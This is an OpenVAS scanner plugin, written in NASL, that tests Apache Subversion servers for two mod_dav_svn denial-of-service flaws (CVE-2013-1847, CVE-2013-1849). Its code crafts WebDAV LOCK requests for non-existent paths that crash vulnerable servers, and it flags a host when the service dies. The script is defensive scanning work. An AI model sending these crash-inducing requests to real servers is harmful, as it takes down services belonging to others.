###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_subversion_lock_url_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Apache Subversion 'mod_dav_svn' Module Multiple DoS Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote attackers to cause a segfault.
  Impact Level: Application

  NOTE : Configurations which allow anonymous read access to the repository
  will be vulnerable.";


tag_affected = "Apache Subversion 1.6.x through 1.6.20 and 1.7.0 through 1.7.8";
tag_insight = "An error within the 'mod_dav_svn' module when handling
  - 'LOCK' requests against a URL for a non-existent path or invalid activity
    URL that supports anonymous locks.
  - 'PROPFIND' request on an activity URL.";
tag_solution = "Upgrade to Apache Subversion version 1.6.21 or 1.7.9 or later,
  For updates refer to http://subversion.apache.org";
tag_summary = "The host is running Apache Subversion and is prone to multiple
  denial of service vulnerabilities.";

if(description)
{
  script_id(802055);
  script_version("$Revision: 11 $");
  script_bugtraq_id(58897, 58323);
  script_cve_id("CVE-2013-1847", "CVE-2013-1849");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-11 12:32:36 +0530 (Tue, 11 Jun 2013)");
  script_name("Apache Subversion 'mod_dav_svn' Module Multiple DoS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/92094");
  script_xref(name : "URL" , value : "http://osvdb.org/92093");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52966/");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Mar/56");
  script_xref(name : "URL" , value : "http://subversion.apache.org/security/CVE-2013-1847-advisory.txt");
  script_xref(name : "URL" , value : "http://subversion.apache.org/security/CVE-2013-1849-advisory.txt");
  script_summary("Check if Apache Subversion is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
  }
  exit(0);
}


include("http_func.inc");
include("misc_func.inc");
include("http_keepalive.inc");

## Variable Initialization
h_port = 0;
banner = "";
req1 = "";
res1 = "";
lock_body = "";
normal_req = "";
normal_res = "";
crafted_req = "";
crafted_res = "";

## Get HTTP Port
h_port = get_http_port(default:80);
if(!h_port){
  h_port = 80;
}

## Check port state
if(!get_port_state(h_port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: h_port);
if(!banner || banner !~ "Server: Apache.* SVN"){
  exit(0);
}

## Get host name
host = get_host_name();
if(!host){
  exit(0);
}

## Confirm HTTP server is alive
if(http_is_dead(port:h_port)) exit(0);

## LOCK request body
lock_body = string('<?xml version="1.0" encoding="UTF-8"?>\n',
                     "<D:lockinfo xmlns:D='DAV:'>\n",
                     '<D:lockscope><D:exclusive/></D:lockscope>\n',
                     '<D:locktype><D:write/></D:locktype>\n',
                     '<D:owner>\n',
                     '<D:href>http://test.test</D:href>\n',
                     '</D:owner>\n',
                     '</D:lockinfo>\n');

## Iterate over possible svn repos
foreach path (make_list("/", "/repo/", "/repository/", "/trunk/", "/svn/",
                        "/svn/trunk/", "/repo/trunk/", "/repo/projects/",
                        "/projects/", "/svn/repos/", cgi_dirs()))
{
  ## Get proper working path
  req1 = http_get(item:string(path), port:h_port);
  res1 = http_keepalive_send_recv(port:h_port, data:req1);

  if((res1 !~ "HTTP/1.. 200 OK")){
    continue;
  }

  ## Send normal request and check for normal response to confirm
  ## Subversion is working as expected
  proper_path = string("LOCK ", path, " HTTP/1.1","\r\n");
  common_req = string("User-Agent: OpenVAS Test Agent\r\n",
                      "Host: ", host , ":", h_port, "\r\n",
                      "Accept: */*\r\n", "Content-Length: ",
                      strlen(lock_body), "\r\n\r\n", lock_body);

  normal_req = string(proper_path, common_req);
  normal_res = http_keepalive_send_recv(port:h_port, data:normal_req);

  ## Confirm proper SVN report response
  if(normal_res =~ "HTTP/1.. 405 Method Not Allowed"){
    continue;
  }

  ## non-existant paths
  rand_path = rand_str(length:8);

  non_existant_path = string("LOCK ", path, rand_path, " HTTP/1.1","\r\n");

  ## Some time Apache servers will re-spawn the listener processes
  ## send non-existant path and check for the response.
  ## If no response than Segmentation fault occurred
  crafted_req = string(non_existant_path, common_req);
  crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);

  ## patched/non-vulnerable version repose HTTP/1.1 401 Authorization Required
  if(crafted_res =~ "HTTP/1.. 401 Authorization Required"){
    exit(0);
  }

  ## some times response has "\r\n" hence check strlen(crafted_res) < 3
  ## Trying 2 times to make sure module is crashing
  if(isnull(crafted_res) || strlen(crafted_res) < 3)
  {
    crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);
    if(isnull(crafted_res) || strlen(crafted_res) < 3)
    {
      security_warning(h_port);
      exit(0);
    }
  }

  ## If http did not re-spawn the listener processes
  if(http_is_dead(port:h_port))
  {
    security_warning(h_port);
    exit(0);
  }
}
